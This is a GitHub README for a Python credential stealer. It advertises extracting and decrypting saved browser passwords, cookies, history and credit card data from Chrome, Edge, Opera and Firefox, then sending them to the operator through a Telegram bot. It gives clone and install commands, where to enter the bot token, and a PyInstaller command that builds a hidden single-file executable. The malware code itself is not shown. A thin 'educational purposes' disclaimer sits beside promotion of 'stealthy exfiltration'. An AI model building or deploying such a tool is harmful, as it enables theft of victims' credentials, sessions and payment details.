# 🕵️‍♂️ Browser Data Stealer

**Advanced tool for extracting browser credentials, history, cookies and payment information with Telegram exfiltration**

![Python](https://img.shields.io/badge/Python-3.8%2B-blue)
![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey)
![License](https://img.shields.io/badge/License-MIT-green)

## 🌟 Features

- **Complete data extraction** from all major browsers:
  - Google Chrome/Edge/Opera (Chromium-based)
  - Mozilla Firefox
- **Decryption capabilities**:
  - AES-GCM encrypted passwords (Chrome v80+)
  - DPAPI protected credentials
- **Stealthy exfiltration** via Telegram bot
- **Comprehensive data collection**:
  - Saved passwords (with decryption)
  - Browser cookies/sessions
  - Complete browsing history
  - Saved credit card information
- **Smart serialization** with proper error handling

## 🛠 Installation

1. **Clone repository**:
   ```bash
   git clone https://github.com/Kol0vratT/Browser-Data-Stealer.git
   cd browser-data-stealer
   ```

2. **Install dependencies**:
   ```bash
   pip install -r requirements.txt
   ```

3. **Configuration**:
   - Edit `main.py` with your Telegram bot credentials:
     ```python
     TELEGRAM_BOT_TOKEN = "your_bot_token"
     TELEGRAM_CHAT_ID = "your_chat_id"
     ```

## 🚀 Usage

```bash
python main.py
```

The tool will automatically:
1. Detect installed browsers
2. Extract all available data
3. Decrypt protected information
4. Send formatted report via Telegram

## 🔍 Data Extraction Details

### Supported Browsers
| Browser | Passwords | Cookies | History | Credit Cards |
|---------|-----------|---------|---------|--------------|
| Chrome  | ✅        | ✅      | ✅      | ✅           |
| Edge    | ✅        | ✅      | ✅      | ✅           |
| Opera   | ✅        | ✅      | ✅      | ✅           |
| Firefox | ✅        | ✅      | ✅      | ❌           |

### Extraction Methods
- **Passwords**: Direct database access + AES/DPAPI decryption
- **Cookies**: SQLite database parsing
- **History**: Comprehensive visit tracking
- **Payment Info**: Credit card form autofill data

## ⚠️ Legal Disclaimer

This tool is provided for **educational purposes only**. The developers assume no liability and are not responsible for any misuse or damage caused by this program. Always ensure you have proper authorization before testing on any system.

## 💻 Development

### Building Executable
```bash
pyinstaller --onefile --windowed --icon=icon.ico main.py
```

### Code Structure
```
├── main.py                - Main extraction logic
├── decryptor.py           - Decryption utilities
├── browser/               - Browser-specific modules
│   ├── chrome.py
│   ├── firefox.py
│   └── edge.py
├── config.py              - Configuration settings
└── requirements.txt       - Dependencies
```

## 📊 Sample Output
```json
{
  "Chrome": {
    "passwords": [
      {
        "url": "https://example.com",
        "username": "user123",
        "password": "decrypted_password"
      }
    ],
    "cookies": [...],
    "history": [...],
    "credit_cards": [...]
  }
}
```

---

> **Warning**: This tool demonstrates security vulnerabilities that exist in modern browsers. Use responsibly and only on systems you own or have permission to test.
